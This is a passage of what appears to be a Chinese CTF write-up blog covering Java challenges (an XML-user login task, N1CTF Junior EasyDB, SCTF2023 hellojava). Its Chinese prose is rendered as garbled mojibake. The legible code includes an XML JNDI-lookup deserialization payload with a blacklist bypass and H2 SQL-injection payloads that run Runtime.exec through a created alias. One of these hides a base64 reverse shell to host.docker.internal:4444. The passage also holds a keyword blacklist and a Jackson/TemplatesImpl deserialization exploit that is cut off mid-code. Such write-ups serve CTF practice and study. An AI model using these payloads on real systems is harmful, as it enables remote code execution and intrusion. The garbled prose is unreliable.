class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> User <span class="hljs-title function_">login</span><span class="hljs-params">(String username, String password)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">File</span> <span class="hljs-variable">userFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(USER_DIR, username + <span class="hljs-string">&quot;.xml&quot;</span>);<br>       <span class="hljs-keyword">if</span> (!userFile.exists()) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> readUser(userFile);<br>           <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span> &amp;&amp; user.getPassword().equals(password)) &#123;<br>               login_in = <span class="hljs-literal">true</span>;<br>               <span class="hljs-keyword">return</span> user;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>           &#125;<br>       &#125;<br>   &#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> User <span class="hljs-title function_">readUser</span><span class="hljs-params">(File userFile)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> FileUtil.readString(userFile, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> content.length();<br>       <span class="hljs-keyword">if</span> (checkSyntax(userFile) &amp;&amp; !content.contains(<span class="hljs-string">&quot;java.&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;springframework.&quot;</span>) &amp;&amp; !content.contains(<span class="hljs-string">&quot;hutool.&quot;</span>) &amp;&amp; length &lt;= maxLength) &#123;<br>           System.out.println(maxLength);<br>           <span class="hljs-keyword">return</span> (User)XmlUtil.readObjectFromXml(userFile);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           System.out.println(maxLength);<br>           System.out.printf(<span class="hljs-string">&quot;Unusual File Detected : %s\n&quot;</span>, userFile.getName());<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>ç™»å½•å¯ä»¥è§¦å‘<code>readObjectFromXml</code>ã€‚</p><p>æœ€åå‡ºé¢˜äººç»™å‡ºçš„è§£é‡Šæ˜¯ï¼Œç”¨editPassæ¥å£çš„replaceé€»è¾‘æ¼æ´ä¿®æ”¹xmlå›ºå®šéƒ¨åˆ†ï¼Œæ³¨é‡Šä»£ç å¹¶ä½¿æ–‡ä»¶é•¿åº¦ç¬¦åˆæ™®é€šç”¨æˆ·xmlï¼Œä»¥åŒæ ·é€»è¾‘é€’å½’æ³¨å…¥é•¿åº¦å°½é‡çŸ­çš„xmlååºåˆ—åŒ–payloadæ‰“JNDIã€‚</p><p>æœ€åæé™é•¿åº¦å½¢å¦‚ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;1&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;javax.naming.InitialContext&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;lookup&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>ldap://127.0.0.1:1389/Deserialize/Jackson/Command/calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">111&lt;111&gt;</span><br><span class="hljs-comment">&lt;/!--&gt;</span><br></code></pre></td></tr></table></figure><p>é»‘åå•ç›´æ¥ç”¨unicodeç¼–ç ç»•è¿‡ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œæ”¹æˆè¿™ç§ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x6a;</span>avax.naming.InitialContext&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç”¨çš„æ˜¯X1å¸ˆå‚…çš„JNDIMapå·¥å…·ï¼ŒæŒºå¥½ä½¿çš„ï¼Œçœäº†å†™Gadgetçš„å·¥å¤«ã€‚</p><p>æœ¬åœ°é€šäº†ï¼Œä½†æ˜¯è¿œç¨‹è¦ä¸€ä¸ªä¸ªæ”¹å¯†ç å¤ªçƒ¦äº†ï¼Œå°±ä¸å»æ‰“äº†å·ä¸ªæ‡’hhã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241022163224216.png" alt="image-20241022163224216"></p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20241022163052969.png" alt="image-20241022163052969"></p><h2 id="N1CTF-Junior-EasyDB"><a href="#N1CTF-Junior-EasyDB" class="headerlink" title="N1CTF_Junior-EasyDB"></a>N1CTF_Junior-EasyDB</h2><p>ç»™çš„æ˜¯H2ä¾èµ–ï¼š</p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20250212160542931.png" class="" title="image-20250212160542931"><p>è¿æ¥é€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&#123;&quot;/login&quot;&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleLogin</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String username, <span class="hljs-meta">@RequestParam</span> String password, HttpSession session, Model model)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.userService.validateUser(username, password)) &#123;<br>            session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, username);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            model.addAttribute(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateUser</span><span class="hljs-params">(String username, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;SELECT * FROM users WHERE username = &#x27;%s&#x27; AND password = &#x27;%s&#x27;&quot;</span>, username, password);<br>        <span class="hljs-keyword">if</span> (!SecurityUtils.check(query)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Throwable var8;<br>            <span class="hljs-keyword">try</span> (<span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.connection.createStatement()) &#123;<br>                stmt.executeQuery(query);<br>                <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> stmt.getResultSet();<br>                <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = resultSet.next();<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var31) &#123;<br>                    var8 = var31;<br>                    var7 = var31;<br>                    <span class="hljs-keyword">throw</span> var31;<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    <span class="hljs-keyword">if</span> (resultSet != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (var7 != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                resultSet.close();<br>                            &#125; <span class="hljs-keyword">catch</span> (Throwable var30) &#123;<br>                                var7.addSuppressed(var30);<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            resultSet.close();<br>                        &#125;<br>                    &#125;<br><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">boolean</span>)var8;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é»‘åå•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtils</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> HashSet&lt;String&gt; blackLists = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SecurityUtils</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String sql)</span> &#123;<br>        <span class="hljs-keyword">for</span>(String keyword : blackLists) &#123;<br>            <span class="hljs-keyword">if</span> (sql.toLowerCase().contains(keyword)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>        blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®å½¢åŒè™šè®¾ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡Nå¤šç§æ–¹æ³•ç»•è¿‡ã€‚</p><p>ç”±äºæ˜¯æ‰“H2ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°å †å æ³¨å…¥çš„é‚£ä¸€ä¸²ã€‚</p><p>è™½ç„¶é¢˜ç›®é‡‡å–äº†é¢„ç¼–è¯‘ï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>String.format</code>ï¼Œä»ç„¶å¯ä»¥æ³¨å…¥æ”»å‡»ã€‚</p><p><a href="https://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#easydb">2025 N1CTF Junior Web æ–¹å‘å…¨è§£ | J1rrYâ€™s Blog</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">admin<span class="hljs-string">&#x27;; CREATE ALIAS evil AS $$void eddie(String cmd) throws Exception&#123; String R=&quot;R&quot;+&quot;untime&quot;;Class&lt;?&gt; c = Class.forName(&quot;java.lang.&quot;+R);Object rt=c.getMethod(&quot;get&quot;+R).invoke(null);c.getMethod(&quot;exe&quot;+&quot;c&quot;,String.class).invoke(rt,cmd);&#125;$$;CALL evil(&#x27;</span>calc.exe<span class="hljs-string">&#x27;); Â -- -</span><br></code></pre></td></tr></table></figure><p>å®˜æ–¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;</span>))); <span class="hljs-comment">// java.lang.Runtime</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;Z2V0UnVudGltZQ==&quot;</span>))); <span class="hljs-comment">// getRuntime</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> m1.invoke(<span class="hljs-literal">null</span>);<br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;ZXhlYw==&quot;</span>)), String[].class); <span class="hljs-comment">// exec</span><br>m2.invoke(o, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(java.util.Base64.getDecoder().decode(<span class="hljs-string">&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA+JjE=&quot;</span>))&#125;&#125;); <span class="hljs-comment">// bash -i &gt;&amp; /dev/tcp/host.docker.internal/4444 0&gt;&amp;1</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&#x27;;CREATE ALIAS hello AS $$ String hello() throws Exception &#123; Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(&quot;Z2V0UnVudGltZQ==&quot;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(&quot;ZXhlYw==&quot;)), String[].class);m2.invoke(o, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, new String(java.util.Base64.getDecoder().decode(&quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE=&quot;))&#125;&#125;);return null; &#125;$$; CALL hello();--</span><br></code></pre></td></tr></table></figure><h2 id="SCTF2023-hellojava"><a href="#SCTF2023-hellojava" class="headerlink" title="SCTF2023-hellojava"></a>SCTF2023-hellojava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&#123;&quot;/Hello/&#123;BaseJson&#125;&quot;&#125;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">Hello</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String BaseJson, <span class="hljs-meta">@RequestBody</span> String param)</span> &#123;<br>    <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">MyBean</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (MyBean)mapper.readValue(Base64.decode(BaseJson), MyBean.class);<br>        <span class="hljs-keyword">if</span> (user.getIfInput()) &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(java.util.Base64.getDecoder().decode(param));<br>            <span class="hljs-type">NoObjectInputStream</span> <span class="hljs-variable">NoInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoObjectInputStream</span>(inputStream);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> NoInputStream.readObject();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">HelloList</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>()).DoSomething((LazyList)obj);<br>            <span class="hljs-keyword">return</span> HelloList;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;<br>        var3.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HelloList&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜¾ç„¶çš„ååºåˆ—åŒ–ç‚¹ä½ï¼Œåªä¸è¿‡é‡å†™äº†resolveClassï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> List&lt;String&gt; list = Blacklist.readBlackList(<span class="hljs-string">&quot;security/blacklist.txt&quot;</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NoObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(inputStream);<br>        System.out.println(<span class="hljs-built_in">this</span>.list);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.list.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>raspå…¶å®æ²¡å•¥ç”¨ã€‚ç”¨AliyunCTF2023é‚£ä¸ªPOJONodeçš„Jacksoné“¾å¯ä»¥ç›´æ¥æ‰“é€šã€‚</p><p>jacksoninjectä¸èƒ½ä»jsonä¸­è·å–ã€‚è¿™ä¸€é¢˜çš„é—®é¢˜ç‚¹å°±æ˜¯æ€ä¹ˆç»™é‚£ä¸ªinputæ³¨å…¥ä¸€ä¸ªå€¼ï¼Œä»–jacksonæ³¨è§£æ˜¯æ ‡è¯†äº†@jacksoninjectï¼Œä½†æ˜¯ç”¨ç©ºå€¼ç»•è¿‡ï¼š</p><p><a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/</a></p><p>æ³¨æ„å¯¼å…¥åŒ…æŠŠé‚£ä¸ªraspçš„agentç»™åˆ æ‰ï¼Œä¸ç„¶å¯¼åŒ…å†²çªä¼šå¤±è´¥ã€‚</p><h3 id="EXP-7"><a href="#EXP-7" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> exp.eddiemurphy;<br><br><span class="hljs-comment">//import com.Sctf.bean.Hello;</span><br><span class="hljs-comment">//import com.Sctf.bean.MyBean;</span><br><span class="hljs-keyword">import</span> com.Sctf.controller.NoObjectInputStream;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> scala.collection.immutable.LazyList;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytes1 = ClassPool.getDefault().get(Calc.class.getName()).toBytecode();<br>        <span class="hljs-type">byte</span>[][] bytecode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes1&#125;;<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>,bytecode);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(obj, <span class="hljs-string">&quot;_sdom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>());<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(obj);<br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        